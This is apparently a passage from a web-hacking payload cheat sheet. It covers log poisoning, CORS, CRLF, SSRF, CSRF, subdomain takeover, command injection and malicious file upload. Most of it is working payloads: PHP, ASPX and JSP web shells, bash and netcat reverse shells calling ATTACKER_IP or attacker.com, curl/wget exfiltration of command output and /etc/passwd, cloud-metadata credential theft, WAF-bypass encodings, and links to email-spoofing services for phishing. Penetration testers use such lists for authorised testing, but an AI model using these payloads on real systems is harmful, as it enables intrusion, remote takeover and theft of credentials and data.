curl http://example.org/ -A "<?php system(\$_GET['cmd']);?>"
```

Note: The logs will escape double quotes so use single quotes for strings in the PHP payload.

Then request the logs via the LFI and execute your command.

```ps1
curl http://example.org/test.php?page=/var/log/apache2/access.log&cmd=id
```
## 10. Missing or Insufficient SPF Record

**Description:** If a domain lacks an SPF record, attackers can send phishing emails that appear legitimate.

### **Tools:**
- [MXToolbox](https://mxtoolbox.com/)
- [SPF Validator](https://www.kitterman.com/spf/validate.html)

### **Exploitation Example:**
```text
From: support@hubspot.net
To: victim@gmail.com
Subject: Email Forgery due to missing SPF
```

**Phishing Tools:**
- [Emkei.cz](https://emkei.cz/)
- [Anonymous Email](https://anonymousemail.me/)
- [5YMail](https://www.5ymail.com/)

---
# CORS (Cross-Origin Resource Sharing) Security Testing Guide

## 1. Testing CORS Misconfigurations (Origin Reflection) | https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet

**Common vulnerable parameters:**

| Parameter | Description |
|-----------|-------------|
| `Origin` | Header used to validate request source |
| `Access-Control-Allow-Origin` | Response header that defines allowed origins |
| `Access-Control-Allow-Credentials` | Enables cookies/auth headers in cross-origin requests |
| `Access-Control-Allow-Methods` | Allowed HTTP methods (GET, POST, etc.) |
| `Access-Control-Allow-Headers` | Allowed custom headers |
| `Access-Control-Max-Age` | Caching duration for preflight responses |

---### 🔥 Bypass Techniques (Adapted from your GitHub repos)

| Technique | Description | Example |
|----------|-------------|---------|
| **Reflected Origin** | Server echoes attacker’s `Origin` | `Origin: https://evil.com` |
| **Regex Bypass** | Exploit loose regex like `.*trusted.com` | `Origin: https://trusted.com.evil.com` |
| **Null Origin** | Use sandboxed iframe or data URI | `Origin: null` |
| **Subdomain Takeover** | Host payload on trusted subdomain | `Origin: https://sub.trusted.com` | `Origin: http://sub.trusted.com` |
| **Credentialed Requests** | Exploit `Access-Control-Allow-Credentials: true` | Combine with reflected origin |
| **Special Characters** | Use `%`, `@`, `` ` `` to bypass regex | `Origin: https://trusted.com%.evil.com` |

## Tools

* [s0md3v/Corsy](https://github.com/s0md3v/Corsy/) - CORS Misconfiguration Scanner
* [chenjj/CORScanner](https://github.com/chenjj/CORScanner) - Fast CORS misconfiguration vulnerabilities scanner
* [@honoki/PostMessage](https://tools.honoki.net/postmessage.html) - POC Builder
* [trufflesecurity/of-cors](https://github.com/trufflesecurity/of-cors) - Exploit CORS misconfigurations on the internal networks
* [omranisecurity/CorsOne](https://github.com/omranisecurity/CorsOne) - Fast CORS Misconfiguration Discovery Tool

# 🔹 Basic CORS Misconfiguration Payloads

* Reflect origin (basic bypass): Origin: https://evil.com → If server reflects it in Access-Control-Allow-Origin, full bypass.
* Wildcard origin: Origin: https://anything.com → Works when Access-Control-Allow-Origin: * with credentials disabled.
* Null origin: Origin: null → Some servers trust null (sandboxed iframe/file://).
* Missing origin validation: Origin: attacker.com → Backend blindly trusts any origin.

# 🔹 Origin Reflection Exploitation

* Arbitrary origin reflection:  Origin: https://evil.com → Response includes same origin.
* Subdomain trick: Origin: https://trusted.com.evil.com → Bypasses weak startsWith() checks.
* Suffix bypass: Origin: https://eviltrusted.com → Bypasses endsWith() checks.
* Prefix bypass:  Origin: https://trusted.com@evil.com → Misparsed by naive validation.
* Dot confusion: Origin: https://trusted.com. → Trailing dot bypass.

# 🔹 Scheme & Protocol Tricks

* HTTP vs HTTPS confusion: Origin: http://trusted.com → Bypass HTTPS-only checks.
* Mixed scheme: Origin: https://trusted.com:80
* Unusual scheme:  Origin: chrome-extension://evil
* File origin:  Origin: file:// → Often treated as trusted.
* Data origin:  Origin: data://evil

# 🔹 Subdomain & Domain Confusion

* Subdomain injection: Origin: https://api.trusted.com.evil.com
* Double domain: Origin: https://trusted.com.evil.org
* Homoglyph attack:  Origin: https://truste𝘥.com → Unicode lookalike.
* Case bypass:  Origin: https://TrUsTeD.com
* DNS rebinding style:  Origin: https://attacker-controlled-domain

# 🔹 Special Origin Values

* Null origin exploit:  Use iframe with sandbox → Origin: null
* Empty origin: Origin: (blank header)
* localhost trust abuse:  Origin: http://localhost
* Internal IP trust:  Origin: http://127.0.0.1
* Private network bypass:  Origin: http://192.168.1.1

# 🔹 Credentials Abuse (Critical)

* Allow credentials misconfig:  Access-Control-Allow-Credentials: true + reflected origin → full data theft.
* Session hijack via CORS:  Malicious site sends request → browser includes cookies automatically.
* Combined exploit:  Origin: https://evil.com + credentials=true → read sensitive API response.

# 🔹 Preflight Request Manipulation

* Force preflight:  Access-Control-Request-Method: POST
* Custom headers: Access-Control-Request-Headers: X-Auth-Token
* Weak validation:  Server allows all methods/headers → full control.
* Bypass filtering:  Add unexpected headers → server whitelists them improperly.

# 🔹 Advanced Exploitation Payloads

## 🧩 Origin Obfuscation

* Mixed case: Origin: https://TrUsTeD.com
* Trailing dot:  Origin: https://trusted.com.
* Embedded credentials:  Origin: https://trusted.com@evil.com
* Encoded origin:  Origin: https://trusted.com%2eevil.com

## 🧩 Encoding Tricks

* URL encoded:  %68%74%74%70%73://evil.com
* Double encoding:  %2565vil.com
* Unicode encoding:  https://truste\u0064.com
* Punycode:  https://xn--trsted-9qa.com

## 🧩 Header Manipulation

* Duplicate Origin headers:  Origin: https://trusted.com, Origin: https://evil.com→ Some servers use last/first value inconsistently.
* Inject via other headers:  X-Origin: https://evil.com
* Proxy header abuse:  X-Forwarded-Origin: https://evil.com

## 🧩 Parsing Confusion

* Multiple values:  Origin: https://trusted.com, https://evil.com
* Whitespace tricks:  Origin:   https://evil.com
* Newline injection:  Origin: https://evil.com%0a
* Tab injection:  Origin: https://evil.com%09
  
# CRLF Injection

## Methodology

HTTP Response Splitting is a security vulnerability where an attacker manipulates an HTTP response by injecting Carriage Return (CR) and Line Feed (LF) characters (collectively called CRLF) into a response header. These characters mark the end of a header and the start of a new line in HTTP responses.

**CRLF Characters**:

* `CR` (`\r`, ASCII 13): Moves the cursor to the beginning of the line.
* `LF` (`\n`, ASCII 10): Moves the cursor to the next line.

By injecting a CRLF sequence, the attacker can break the response into two parts, effectively controlling the structure of the HTTP response. This can result in various security issues, such as:

* Cross-Site Scripting (XSS): Injecting malicious scripts into the second response.
* Cache Poisoning: Forcing incorrect content to be stored in caches.
* Header Manipulation: Altering headers to mislead users or systems

# 🔹 Basic CRLF Injection Payloads

* New header injection:  %0d%0aX-Test: injected → Adds a new HTTP header.
* Response splitting:  %0d%0a%0d%0a<h1>Injected</h1> → Starts a new HTTP response body.
* Header overwrite:  %0d%0aContent-Type: text/html → Changes response content type.
* Cookie injection:  %0d%0aSet-Cookie: admin=true → Sets arbitrary cookie.
* Location header injection:  %0d%0aLocation: https://evil.com → Forces redirect.

# 🔹 HTTP Response Splitting

* Full response injection:  %0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type: text/html%0d%0a%0d%0a<h1>Owned</h1>  → Creates second response.
* HTML injection via response:  %0d%0a%0d%0a<script>alert(1)</script> → Injects content into browser.
* Cache poisoning response:  %0d%0a%0d%0a<html>Cached Evil</html>  → Stored by proxy/CDN.

# 🔹 Header Injection Attacks

* Inject custom header:  %0d%0aX-Forwarded-For: 127.0.0.1
* Inject Host header:  %0d%0aHost: evil.com
* Inject Authorization header:  %0d%0aAuthorization: Bearer evil
* Inject Content-Length:  %0d%0aContent-Length: 0
* Inject CORS header:  %0d%0aAccess-Control-Allow-Origin: *

# 🔹 Cookie Manipulation

* Set arbitrary cookie:  %0d%0aSet-Cookie: session=attacker
* Privilege escalation cookie:  %0d%0aSet-Cookie: role=admin
* Cookie overwrite:  %0d%0aSet-Cookie: session=admin; path=/
* Persistent cookie:  %0d%0aSet-Cookie: admin=true; HttpOnly

# 🔹 Redirect & Location Injection

* Open redirect:  %0d%0aLocation: https://evil.com
* Header + redirect:  %0d%0aSet-Cookie: admin=true%0d%0aLocation: https://evil.com
* Relative redirect:  %0d%0aLocation: //evil.com

# 🔹 Log Injection (Log Poisoning)

* Inject into logs:  %0d%0aINFO: User logged in as admin
* Multi-line log injection: %0d%0aERROR: Failed login%0d%0aINFO: Admin login
* Log-based XSS:  %0d%0a<script>alert(1)</script>

# 🔹 Cache Poisoning via CRLF

* Inject cacheable response:  %0d%0aCache-Control: public, max-age=3600
* Poison CDN cache:  %0d%0a%0d%0a<html>Evil Cached Page</html>
* Modify Vary header:  %0d%0aVary: User-Agent

# 🔹 Email Header Injection

* Inject BCC header:  %0d%0aBcc: attacker@evil.com
* Inject CC header:  %0d%0aCc: attacker@evil.com
* Subject manipulation:  %0d%0aSubject: Hacked
* Multi-recipient injection:  %0d%0aTo: victim@target.com, attacker@evil.com

# 🔹 WAF Bypass Techniques (CRLF)

## 🧩 Encoding Tricks

* URL encoding:  %0d%0a → Standard CRLF
* Double encoding:  %250d%250a → Decoded twice
* Mixed encoding:  %0D%0A → Case variation
* Partial encoding:  %0d\n

## 🧩 Obfuscation Techniques

* Insert spaces:  %0d%0a X-Test: injected
* Tab injection:  %0d%0a%09X-Test: injected
* Multiple CRLF:  %0d%0a%0d%0a%0d%0a
* Null byte injection:  %0d%0a%00X-Test: injected

## 🧩 Header Parsing Tricks

* Duplicate headers:  %0d%0aSet-Cookie: user=guest%0d%0aSet-Cookie: user=admin
* Header overwrite race:  %0d%0aContent-Type: text/plain%0d%0aContent-Type: text/html
* Merge headers:  %0d%0aX-Test: a%0d%0aX-Test: b

## 🧩 Filter Bypass Variants

* Alternate line breaks:  %0a (LF only) or %0d (CR only)
* Unicode encoding:  %u000d%u000a
* Raw newline injection:  \r\nX-Test: injected

# 🔹 Real-World Attack Scenarios

* Session fixation:  Inject Set-Cookie: session=attacker → Hijack session.
* Cache poisoning:  Inject malicious HTML → Cached by CDN → served to users.
* Open redirect:  Inject Location header → redirect victims.
* Email abuse:  Inject BCC → send spam via application.
* Security bypass:  Inject headers like X-Forwarded-For: 127.0.0.1

## Basic SSRF Payloads

* Localhost access:  http://127.0.0.1 → Access internal services.
* Loopback hostname: http://localhost → Same as loopback.
* IPv6 localhost:  http://[::1] → IPv6 bypass.
* Internal hostname:  http://internal → Access internal DNS.
* Private IP:  http://192.168.1.1 → Internal network scan.

# 🔹 Internal Network Targeting

* RFC1918 ranges:  http://10.0.0.1, http://172.16.0.1, http://192.168.0.1
* Docker network:  http://172.17.0.1
* Kubernetes API:  https://kubernetes.default.svc
* Service discovery:  http://consul.service.consul

# 🔹 Cloud Metadata Exploitation

* AWS metadata:  http://169.254.169.254/latest/meta-data/
* AWS IAM creds:  http://169.254.169.254/latest/meta-data/iam/security-credentials/
* GCP metadata:  http://metadata.google.internal/computeMetadata/v1/
* Azure metadata:  http://169.254.169.254/metadata/instance
* GCP header requirement:  Add header: Metadata-Flavor: Google

# 🔹 URL Parser Bypass Payloads

* Using @ trick: http://127.0.0.1@evil.com → Parser confusion.
* Double @:  http://evil.com@127.0.0.1
* Userinfo bypass:  http://admin@127.0.0.1
* Fragment bypass:  http://127.0.0.1#evil.com
* Query override:  http://evil.com?url=http://127.0.0.1

# 🔹 IP Encoding Bypass

* Decimal IP:  http://2130706433 → 127.0.0.1
* Octal IP:  http://0177.0.0.1
* Hex IP:  http://0x7f000001
* Mixed encoding:  http://127.1
* Short notation:  http://127.0.1

# 🔹 DNS Rebinding Techniques

* Attacker domain:  http://attacker.com → Resolves to internal IP later.
* Dual resolution:  http://rebind.evil.com
* Wildcard DNS:  http://127.0.0.1.nip.io

***

# 🔹 Protocol-Based SSRF

* File protocol: file:///etc/passwd
* Dict protocol:  dict://127.0.0.1:11211
* Gopher payload:  gopher://127.0.0.1:6379/_INFO
* FTP protocol:  ftp://127.0.0.1
* SMB (Windows):  \\127.0.0.1\share

# 🔹 Gopher Advanced Payloads

* Redis command: gopher://127.0.0.1:6379/_SET%20key%20value
* HTTP request smuggling:  gopher://127.0.0.1:80/_GET%20/admin%20HTTP/1.1
* SMTP injection:  gopher://127.0.0.1:25/_HELO%20evil.com

# 🔹 Path Traversal in SSRF

* File read via SSRF:  http://target/?url=file:///etc/passwd
* Wrapper chaining:  http://target/?url=php://filter/...

# 🔹 Open Redirect Chaining

* Redirect abuse:  http://trusted.com/redirect?url=http://127.0.0.1
* Double redirect: http://trusted.com/?next=http://evil.com/?url=http://127.0.0.1

# 🔹 SSRF via Headers

* Host override:  Host: 127.0.0.1
* X-Forwarded-For: X-Forwarded-For: 127.0.0.1
* X-Original-URL:  /admin
* X-Rewrite-URL:  /admin

# 🔹 SSRF in Different Contexts

* Image URL:  http://127.0.0.1
* PDF generator:  http://127.0.0.1/admin
* Webhook URL:  http://127.0.0.1
* Callback URL:  http://localhost

# 🔹 WAF Bypass Techniques (SSRF)
## 🧩 Encoding Tricks

* URL encoding: http%3a%2f%2f127.0.0.1
* Double encoding:  http%253a%252f%252f127.0.0.1
* Mixed encoding:  http://127.0.0.1%2f
* Unicode bypass:  http://127.0.0.1\u0000

## 🧩 Domain Obfuscation

* Subdomain trick:  http://127.0.0.1.evil.com
* Long domain: http://127.0.0.1.attacker.com
* Fake trusted domain:  http://trusted.com.evil.com

## 🧩 Whitelist Bypass

* Prefix match bypass:  http://trusted.com@127.0.0.1
* Suffix bypass:  http://127.0.0.1.trusted.com
* Regex bypass:  http://trusted.com/.@127.0.0.1

## 🧩 Scheme Confusion

* Mixed protocol:  HtTp://127.0.0.1
* Missing scheme:  //127.0.0.1
* Custom scheme:  http:\\127.0.0.1

## 🧩 DNS Tricks

* Embedded IP:  http://[::ffff:127.0.0.1]
* Null byte:  http://127.0.0.1%00.evil.com

# 🔹 Cloud Metadata Advanced Bypass

* AWS v1:  http://169.254.169.254/latest/meta-data/
* AWS v2 bypass attempt:  Use PUT request with token fetch
* GCP header injection:  Metadata-Flavor: Google
* Azure API version:  http://169.254.169.254/metadata/instance?api-version=2021-02-01

# 🔹 Real-World Attack Scenarios

* IAM credential theft → AWS metadata endpoint
* Internal admin panel access → http://127.0.0.1/admin
* Redis exploitation → gopher payload
* Kubernetes takeover → access API server
* File disclosure → file:///etc/passwd

## CSRF Test Case (with Bypass Cases)

# 🔹 Basic CSRF Payloads

* Simple GET CSRF:  https://target.com/change-email?email=evil@attacker.com → Triggers request automatically.
* Link-based CSRF:  https://target.com/delete-accountClick me</a> → Social engineering.
* Hidden iframe request:  https://target.com/admin/delete-user?id=1</iframe> → Silent execution.

# 🔹 POST-Based CSRF Attacks
* JSON CSRF (if supported):
  js
  fetch("https://target.com/api/update", {
    method: "POST",
    body: JSON.stringify({"role":"admin"})
  })
  
# 🔹 CSRF Token Bypass Techniques

* Missing token attack:  Send request without CSRF token → works if not enforced.
* Token reuse:  Use previously captured valid token → replay attack.
* Predictable token:  csrf_token=12345 → weak/random generation.
* Token in GET:  https://target.com/?token=abc123 → exposed/reflected.
* Token not tied to session:  Use token from another user/session.

# 🔹 SameSite Cookie Bypass

* Use GET request:  Cookies sent if SameSite=Lax → bypass with GET.
* Top-level navigation:  https://target.com/action → allowed by browser.
* Link click forcing:  Social engineering to trigger request.

# 🔹 Content-Type Bypass

* Change content type:  application/x-www-form-urlencoded → might bypass JSON-only validation.
* Send JSON as text:  Content-Type: text/plain
* Multipart bypass:  multipart/form-data
* Missing content-type:  No header → backend may still parse.

# 🔹 Origin / Referer Check Bypass

* Missing header:  Remove Origin header → backend skips validation.
* Fake origin: Origin: https://trusted.com
* Null origin: Origin: null → some servers trust null.
* Referer spoof:  Referer: https://trusted.com/page

# 🔹 Advanced CSRF Exploitation

* CORS + CSRF combo:  Use misconfigured CORS to read response.
* DNS rebinding:  Victim browser resolves attacker domain → internal target.
* Login CSRF:  Force victim to log into attacker account:
* Logout CSRF:  https://target.com/logout

# 🔹 GET Parameter Manipulation

* Multiple parameters:  ?role=user&role=admin
* Hidden parameters:  ?action=delete&id=1
* Privilege escalation:  ?isAdmin=true

# 🔹 CSRF in API Endpoints

* Fetch API request:
  js
  fetch("https://target.com/api/delete", {
    method: "POST",
    credentials: "include"
  })
  
* XHR request:
  js
  var xhr = new XMLHttpRequest();
  xhr.open("POST","https://target.com/update",true);
  xhr.send("role=admin");
  

# 🔹 WAF Bypass Techniques (CSRF)

## 🧩 Request Method Tricks

* Switch POST → GET:  GET /delete?id=1
* Use HEAD method:  HEAD /action
* Use OPTIONS:  OPTIONS /endpoint

## 🧩 Encoding Tricks

* URL encoding:  %72%6f%6c%65=admin
* Double encoding:  %2572%256f%256c%2565=admin
* Case variation:  RoLe=AdMiN

## 🧩 Parameter Pollution

* Duplicate params:  role=user&role=admin
* Array style:  role[]=user&role[]=admin

## 🧩 Header Manipulation

* Remove Origin/Referer
* Modify headers manually via proxy tools
* Add fake headers:  X-Origin: trusted

## 🧩 Delivery Bypass

* Use different HTML tags:  * <img>,  * <iframe>, \\,  * \\
* Use delayed execution:  setTimeout(() => form.submit(), 1000)

# 🔹 Real-World Attack Scenarios

* Password change:  Auto-submit form → resets victim password.
* Fund transfer:  Hidden POST → sends money.
* Email change:  /change-email?email=evil@attacker.com
* Account deletion:  /delete-account
* Admin action abuse:  Silent admin operation using victim session.

## 7. Hostile Subdomain Takeover

### Attack Scenario:
1. Find subdomains that point to inactive services.
2. Register on the third-party service and claim the subdomain.
3. Set up phishing attacks on the hijacked subdomain.

### Scanning for Takeovers:
```bash
ruby sub_brust.rb --fast nokia.com
```

# 🔹 Basic Subdomain Takeover Checks

* Unclaimed service (CNAME): `sub.target.com → cname → unclaimed.service.com` → Service not configured → takeover possible.
* NXDOMAIN reference: `sub.target.com → cname → non-existing.domain` → Register domain → hijack.
* Dangling DNS entry:  Subdomain points to deleted cloud resource → attacker reclaims it.
* Expired domain: CNAME → expired domain → attacker buys domain → gains control.

# 🔹 Common Vulnerable Services

* AWS S3 bucket:\  `sub.target.com → bucket.s3.amazonaws.com`\  → Bucket doesn’t exist → create same bucket name.
* Azure / Blob storage:  `sub.target.com → storage.azure.com`

# 🔹 DNS & Domain Manipulation

* Register expired domain:  Domain used in CNAME expires → attacker buys.
* Wildcard DNS abuse: `*.target.com → attacker-controlled service`
* Chained subdomain:  `sub.target.com → sub.sub.target.com`
* Dangling NS records:  Subdomain points to deleted nameserver.

## 🧩 AWS S3

* Bucket creation:\
  Create bucket with same name\
  → Host malicious content.

* Endpoint test:\
  `http://bucket.s3.amazonaws.com`
## 🔹 Proof of Concept (PoC)

### Step 1: Identify dangling DNS
```
dig subdomain.example.com
```
### Step 2: Observe response* Points to unused external provider
### Step 3: Claim resource  Register bucket/app/service with same name as DNS target
### Step 4: Validate takeover

* Upload test content
* Access via:
```
http://subdomain.example.com
```
### Example:

```
PoC message: "Subdomain takeover by <your-name>"
```
## 🧩 DNS Tricks

* Trailing dot:\`sub.target.com.`
* Alternate resolution:`sub.target.com.evil.com`
* DNS rebinding:  Switch IP after validation.

## References:
- [PayloadsAllTheThings - CORS Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CORS%20Misconfiguration)
- [CRLF Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection)
- [SSRF Payloads](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF)
- [CSRF Exploits](https://github.com/qazbnm456/awesome-web-security/blob/master/README.md#csrf---cross-site-request-forgery)

---
# Security Testing Techniques

## 13. Command Injection
```
cmd, command, execute, exec, run, shell, process, task, action, operation, script, script_path, script_name, filename, filepath, file, path, dir, directory, target, ip, host, hostname, ping, traceroute, nslookup, dns, lookup, port, interface, netstat, subnet, mask, gateway, route, user, username, account, name, key, token, id, uid, gid, group, env, env_var, variable, config, config_path, config_file, backup, restore, upload, download, log, log_path, log_file, debug, trace, monitor, scan, scanner, tool, utility, filename, darmon, host, upload, dir, execute, download, log, ip, cli, cmd, file=, email
```
### Tool:
- [Commix](https://github.com/commixproject/commix)

* `;` (Semicolon): Allows you to execute multiple commands sequentially.
* `&&` (AND): Execute the second command only if the first command succeeds (returns a zero exit status).
* `||` (OR): Execute the second command only if the first command fails (returns a non-zero exit status).
* `&` (Background): Execute the command in the background, allowing the user to continue using the shell.
* `|` (Pipe):  Takes the output of the first command and uses it as the input for the second comman

# 🔹 Basic Command Injection Payloads

* Simple command execution:   ; id → Executes id command.
* Command chaining:  && whoami → Runs command if previous succeeds.
* OR execution:  || whoami → Runs if previous fails.
* Pipe execution:  | whoami → Pipes output to next command.
* Backtick execution:    whoami  → Executes inline command.

# 🔹 OS Command Injection Variants

* Linux commands:  ; uname -al,   ; cat /etc/passwd,   ; ls -la
* Windows commands:  & whoami, & dir, & type C:\Windows\win.ini
* Mixed separators: ; whoami && id

# 🔹 Blind Command Injection Payloads

* Time delay (Linux):  ; sleep 5
* Time delay (Windows): & timeout 5
* DNS exfiltration: ; nslookup attacker.com

* HTTP callback: ; curl http://attacker.com
* Ping-based detection:  ; ping -c 4 attacker.com

# 🔹 Command Injection with Output Exfiltration

* Curl exfiltration: ; curl http://attacker.com/?data=$(whoami)
* Wget exfiltration:  ; wget http://evil.com/$(id)
* DNS exfiltration:  ; nslookup $(hostname).attacker.com
* File exfiltration:  ; curl -X POST -d @/etc/passwd attacker.com

# 🔹 File Read / Write Payloads

* Read sensitive file:  ; cat /etc/passwd
* Read environment variables:  ; env
* Write file:  ; echo hacked > test.txt
* Append file:  ; echo test >> file.txt

# 🔹 Reverse Shell Payload Indicators

* Bash reverse shell:; bash -i >& /dev/tcp/attacker/4444 0>&1
* Netcat reverse shell:  ; nc attacker.com 4444 -e /bin/sh
* Python shell:  ; python -c 'import os;os.system("sh")'

# 🔹 Command Injection in Different Contexts

* Within parameter: test;whoami
* Inside quotes:  " ; whoami #
* Numeric context:  1; whoami
* JSON input:  {"cmd":";whoami"}

# 🔹 WAF Bypass Techniques (Command Injection)
## 🧩 Encoding Tricks

* URL encoding: %3bwhoami
* Double encoding:  %253bwhoami
* Hex encoding:  \x77\x68\x6f\x61\x6d\x69
* Base64 execution:  echo d2hvYW1p | base64 -d | sh
* Split commands:  w'h'o'am'i
* Use wildcards:   w*oami
* Concatenation:  who$@ami
* Newline injection:  %0awhoami
* Tab bypass:  %09whoami
* Mixed separator:  ;|whoami
* Logical operators:  &&& whoami
* Case variation:  WhOaMi
* Partial command:  /bin/whoami
* Subshell:  $(whoami)
* Nested execution:   id 
* Process substitution:  <(whoami)
* Eval usage:  eval whoami

# 🔹 Brute Force Command Injection Payload List
## ✅ Common Commands (Try All)
```
whoami
id
uname -a
pwd
ls
ls -la
cat /etc/passwd
env
printenv
hostname
;whoami
&& whoami
|| whoami
| whoami
;id
&& id
|| id
| id
%3bwhoami
%0awhoami
%09whoami
%3bid
%0aid
whoami$IFS
cat$IFS/etc/passwd
ls$IFS-la
w'h'o'a'm'i
who$@ami
who$(echo ami)
& whoami
& dir
& hostname
& type C:\Windows\win.ini
; sleep 5
& timeout 5
; ping attacker.com
; curl attacker.com
; cat /etc/passwd
; cat /etc/shadow
; cat /proc/self/environ
; type C:\Windows\win.ini
* Remote Code Execution → Inject shell commands
* Data theft → Read sensitive files
* Server takeover → Reverse shell execution
* Cloud compromise → Access metadata endpoints
* Lateral movement → Execute internal commands
```
## Insecure Management Interface
Insecure Management Interfaces may lack proper security measures, such as strong authentication, encryption, or IP restrictions, allowing unauthorized users to potentially gain control over critical systems. Common issues include using default credentials, unencrypted communications, or exposing the interface to the public internet.

* Lack of Authentication or Weak Authentication:
    * Interfaces accessible without requiring credentials.
    * Use of default or weak credentials (e.g., admin/admin).
    ```ps1
    nuclei -t http/default-logins -u https://example.com
    ```
* Exposure to the Public Internet
    ```ps1
    nuclei -t http/exposed-panels -u https://example.com
    nuclei -t http/exposures -u https://example.com
    ```
* Sensitive data transmitted over plain HTTP or other unencrypted protocols

**Examples**:

* **Network Devices**: Routers, switches, or firewalls with default credentials or unpatched vulnerabilities.
* **Web Applications**: Admin panels without authentication or exposed via predictable URLs (e.g., /admin).
* **Cloud Services**: API endpoints without proper authentication or overly permissive roles.

# Insecure Source Code Management

> Insecure Source Code Management (SCM) can lead to several critical vulnerabilities in web applications and services. Developers often rely on SCM systems like Git and Subversion (SVN) to manage their source code versions. However, poor security practices, such as leaving .git and .svn folders in production environments exposed to the internet, can pose significant risks. 


## Summary

* [Methodology](#methodology)
    * [Bazaar](./Bazaar.md)
    * [Git](./Git.md)
    * [Mercurial](./Mercurial.md)
    * [Subversion](./Subversion.md)
* [Labs](#labs)
* [References](#references)


## Methodology

Exposing the version control system folders on a web server can lead to severe security risks, including: 

- **Source Code Leaks** : Attackers can download the entire source code repository, gaining access to the application's logic.
- **Sensitive Information Exposure** : Embedded secrets, configuration files, and credentials might be present within the codebase.
- **Commit History Exposure** : Attackers can view past changes, revealing sensitive information that might have been previously exposed and later mitigated.
     
The first step is to gather information about the target application. This can be done using various web reconnaissance tools and techniques. 

* **Manual Inspection** : Check URLs manually by navigating to common SCM paths.
    * http://target.com/.git/
    * http://target.com/.svn/

* **Automated Tools** : Refer to the page related to the specific technology.

Once a potential SCM folder is identified, check the HTTP response codes and contents. You might need to bypass `.htaccess` or Reverse Proxy rules.

The NGINX rule below returns a `403 (Forbidden)` response instead of `404 (Not Found)` when hitting the `/.git` endpoint.

```ps1
location /.git {
  deny all;
}
```
For example in Git, the exploitation technique doesn't require to list the content of the `.git` folder (http://target.com/.git/), the data extraction can still be conducted when files can be read.

## Labs

* [Root Me - Insecure Code Management](https://www.root-me.org/fr/Challenges/Web-Serveur/Insecure-Code-Management)

## References

- [Hidden directories and files as a source of sensitive information about web application - Apr 30, 2017](https://github.com/bl4de/research/tree/master/hidden_directories_leaks)
- 

## References

- [CAPEC-121: Exploit Non-Production Interfaces - CAPEC - July 30, 2020](https://capec.mitre.org/data/definitions/121.html)
- [Exploiting Spring Boot Actuators - Michael Stepankin - Feb 25, 2019](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
- [Springboot - Official Documentation - May 9, 2024](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html)

## 14. File Uploading

### Tools:
- [Fuxploider](https://github.com/almandin/fuxploider)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)

# 🔹 Basic File Upload Payloads

* Simple PHP shell:
  php
  <?php system($_GET['cmd']); ?>
    → Executes system commands via uploaded file.
* Basic webshell:
  php
  <?php echo shell_exec($_GET['cmd']); ?>
  
* HTML file upload: <h1>Injected</h1>
* SVG upload (XSS):
  xml
  <svg><script>alert(1)</script></svg>
  
# 🔹 Common Malicious File Types

* PHP shell: shell.php
* ASP shell:  shell.asp
* JSP shell: shell.jsp
* Python shell:shell.py
* Executable file: shell.exe
* 2.1 Simple Web Shell Upload:  <?php system($_GET['cmd']); ?>
* 2.2 Double Extension File: shell.php.jpg
* 2.3 Fake MIME Type Header: Content-Type: image/jpeg
* 2.4 Null Byte Injection (Legacy PHP):  shell.php%00.jpg
* 2.5 Polyglot Image + PHP:  GIF89a; <?php echo shell_exec($_GET['cmd']); ?>
* 2.6 Malicious SVG Upload (XSS):  <svg><script>alert(1)</script></svg>
* 2.7 .htaccess to Force PHP Execution: AddType application/x-httpd-php .jpg
* 2.8 Upload Path Traversal:  ../../../../tmp/shell.php
* 2.9 Malicious EXIF Injection: exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg
* 3.1 PHP One-Liner Shell:  <?=`$_GET[0]`?>
* 3.2 ASPX Web Shell: <%@ Page Language="C#" %><% Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c "+Request["cmd"])); %>
* 3.3 JSP Reverse Shell: <%@ page import="java.io.*"%><%Runtime.getRuntime().exec("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'");%>
* 3.4 WAR Upload (Tomcat): [WAR archive containing malicious JSP]
* 3.5 PHP File Hidden in JPEG (Polyglot): ÿØÿà<?php echo shell_exec($_GET['cmd']); ?>
* 3.6 SVG with External Entity (SVG XXE): <!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]><svg>&x;</svg>

# 🔹 Double Extension Bypass

* Double extension:  shell.php.jpg
* Multiple extensions: shell.php.png.jpg
* Reverse order: shell.jpg.php
* Hidden extension: shell.php;.jpg
* Mixed case: shell.pHp

# 🔹 Null Byte Injection (Legacy)

* Null byte trick:  shell.php%00.jpg
* Combined: shell.php%00.png
* Traversal + null: ../../shell.php%00.jpg

# 🔹 MIME Type Bypass

* Fake content type:  Content-Type: image/jpeg (while uploading PHP)
* Multiple MIME:  Content-Type: image/jpeg, application/php
* Null MIME:   Content-Type: application/octet-stream
* Missing MIME header:  Remove Content-Type

# 🔹 Magic Byte / Signature Bypass

* JPEG magic bytes:
  php
  \xFF\xD8\xFF<?php system($_GET['cmd']); ?>
  
* PNG magic bytes:
  php
  \x89PNG<?php system($_GET['cmd']); ?>
  
* GIF header:
  php
  GIF89a<?php system($_GET['cmd']); ?>
  

# 🔹 File Content Obfuscation

* Base64 payload:
  php
  <?php eval(base64_decode("c3lzdGVtKCRfR0VUWydjbWQnXSk7")); ?>
  
* Hex encoded:
  php
  <?php system("\x69\x64"); ?>
  
* Split payload:\
  <?ph + p system($_GET['cmd']); ?>

# 🔹 Image + Shell Polyglots

* JPG + PHP:
  php
  <?php system($_GET['cmd']); ?> (inside image)
  
* SVG polyglot:\
  Combines XML + JS + HTML
* ZIP + PHP polyglot:\
  Upload valid archive containing shell

# 🔹 File Path Manipulation

* Directory traversal:  ../../shell.php
* Absolute overwrite:  /var/www/html/shell.php
* Hidden files:  .htaccess
* Temp file override:  /tmp/shell.php

# 🔹 .htaccess Injection

* Force PHP execution:
  
  AddType application/x-httpd-php .jpg
  
* Execute inside image:\
  Rename .jpg → runs as PHP

# 🔹 Upload + LFI Combo

* Upload shell → include via LFI:  /uploads/shell.jpg
* Temp file inclusion:  /tmp/phpXXXX
